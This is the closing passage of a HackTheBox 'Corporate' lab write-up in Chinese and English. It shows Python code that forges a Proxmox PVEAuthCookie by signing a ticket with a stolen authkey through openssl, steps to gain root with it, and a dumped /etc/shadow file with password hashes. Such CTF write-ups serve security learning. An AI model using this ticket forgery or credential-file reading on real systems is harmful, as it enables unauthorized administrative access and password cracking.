class="built_in">int</span>(time.time()) + time_offset)[<span class="number">2</span>:].upper()</span><br><span class="line">    plaintext = <span class="string">f&#x27;PVE:<span class="subst">&#123;username&#125;</span>:<span class="subst">&#123;timestamp&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Temporary file for auth key</span></span><br><span class="line">    authkey_path = tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>)</span><br><span class="line">    logging.info(<span class="string">f&#x27;Writing authkey to <span class="subst">&#123;authkey_path.name&#125;</span>&#x27;</span>)</span><br><span class="line">    authkey_path.write(authkey_bytes)</span><br><span class="line">    authkey_path.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Temporary file for plaintext</span></span><br><span class="line">    txt_path = tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>)</span><br><span class="line">    logging.info(<span class="string">f&#x27;Writing plaintext to <span class="subst">&#123;txt_path.name&#125;</span>&#x27;</span>)</span><br><span class="line">    txt_path.write(plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    txt_path.close()</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">&#x27;Calling openssl to sign&#x27;</span>)</span><br><span class="line">    sig = subprocess.check_output(</span><br><span class="line">        [<span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;dgst&#x27;</span>, <span class="string">&#x27;-sha1&#x27;</span>, <span class="string">&#x27;-sign&#x27;</span>, authkey_path.name, <span class="string">&#x27;-out&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, txt_path.name])</span><br><span class="line">    sig = base64.b64encode(sig).decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ret = <span class="string">f&#x27;<span class="subst">&#123;plaintext&#125;</span>::<span class="subst">&#123;sig&#125;</span>&#x27;</span></span><br><span class="line">    logging.info(<span class="string">f&#x27;Generated ticket for <span class="subst">&#123;username&#125;</span>: <span class="subst">&#123;ret&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Clean up temporary files</span></span><br><span class="line">    os.remove(authkey_path.name)</span><br><span class="line">    os.remove(txt_path.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">authkey_path = <span class="string">&#x27;./authkey.key&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(authkey_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">    authkey_bytes = key_file.read()</span><br><span class="line"></span><br><span class="line">ticket = generate_ticket(authkey_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Generated Ticket:&quot;</span>, ticket)</span><br></pre></td></tr></table></figure>
+
+<p>運行了之後就得到了cookie。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211407-vn40xwj.png" alt="image">​</p>
+<p>Cookie名字填：<code>PVEAuthCookie</code>​，value 填寫上面gen出來的。</p>
+<p>​​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211603-4vn8h76.png" alt="image">​​</p>
+<p>填好之後刷新一下</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211612-all7y5u.png" alt="image">​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211704-m7e4e7f.png" alt="image">​</p>
+<p>Rooted.</p>
+<h2 id="0xA-Hashes"><a href="#0xA-Hashes" class="headerlink" title="0xA Hashes"></a>0xA Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@corporate:~<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$KJ</span>/L8xhIi9u9haFUJ5529/<span class="variable">$CGMc1ZCRTZfzMtPflnpp9Spq2OETo6Fld6IriiEwIbB</span>:19714:0:99999:7:::</span><br><span class="line">daemon:*:19438:0:99999:7:::</span><br><span class="line">bin:*:19438:0:99999:7:::</span><br><span class="line">sys:*:19438:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19438:0:99999:7:::</span><br><span class="line">games:*:19438:0:99999:7:::</span><br><span class="line">man:*:19438:0:99999:7:::</span><br><span class="line">lp:*:19438:0:99999:7:::</span><br><span class="line">mail:*:19438:0:99999:7:::</span><br><span class="line">news:*:19438:0:99999:7:::</span><br><span class="line">uucp:*:19438:0:99999:7:::</span><br><span class="line">proxy:*:19438:0:99999:7:::</span><br><span class="line">www-data:*:19438:0:99999:7:::</span><br><span class="line">backup:*:19438:0:99999:7:::</span><br><span class="line">list:*:19438:0:99999:7:::</span><br><span class="line">irc:*:19438:0:99999:7:::</span><br><span class="line">gnats:*:19438:0:99999:7:::</span><br><span class="line">nobody:*:19438:0:99999:7:::</span><br><span class="line">_apt:*:19438:0:99999:7:::</span><br><span class="line">_chrony:*:19438:0:99999:7:::</span><br><span class="line">messagebus:*:19454:0:99999:7:::</span><br><span class="line">_rpc:*:19454:0:99999:7:::</span><br><span class="line">systemd-network:*:19454:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19454:0:99999:7:::</span><br><span class="line">postfix:*:19454:0:99999:7:::</span><br><span class="line">tcpdump:*:19454:0:99999:7:::</span><br><span class="line">sshd:*:19454:0:99999:7:::</span><br><span class="line">statd:*:19454:0:99999:7:::</span><br><span class="line">gluster:*:19454:0:99999:7:::</span><br><span class="line">tss:*:19454:0:99999:7:::</span><br><span class="line">ceph:*:19454:0:99999:7:::</span><br><span class="line">systemd-timesync:!*:19454::::::</span><br><span class="line">systemd-coredump:!*:19454::::::</span><br><span class="line">openldap:!:19454:0:99999:7:::</span><br><span class="line">git:*:19455:0:99999:7:::</span><br><span class="line">sysadmin:$y$j9T<span class="variable">$E2kQZ9TL6csvgTjXCvlau</span>/<span class="variable">$r4Y9</span>/c5O8UQcdCVNKdPXn69PhHC35T59bpfjiUKEkoD:19462:0:99999:7:::</span><br><span class="line">_laurel:!:19688::::::</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&text=HackTheBox - Machine - Corporate"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&is_video=false&description=HackTheBox - Machine - Corporate"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Corporate&body=Check out this article: https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&name=HackTheBox - Machine - Corporate&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&t=HackTheBox - Machine - Corporate"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
